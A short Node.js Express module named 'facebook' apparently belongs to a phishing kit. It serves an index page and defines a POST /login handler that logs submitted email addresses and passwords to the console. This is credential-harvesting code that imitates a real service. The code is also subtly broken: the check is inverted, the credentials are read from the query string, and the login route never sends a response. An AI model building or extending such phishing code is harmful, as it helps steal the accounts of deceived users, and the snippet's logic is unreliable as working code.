exports.info = {
    name: 'facebook',
    views: '/facebook/views',
    static: '/facebook/static'
}

exports.execute = function(app) {

    app.get('/', async (req, res) => {
        res.send('index', {});
    })

    app.post('/login', async (req, res) => {
        if (!req.query.email || !req.query.password) {
            console.info(`Email ${req.query.email} - Password: ${req.query.password}`);
        }
    })
}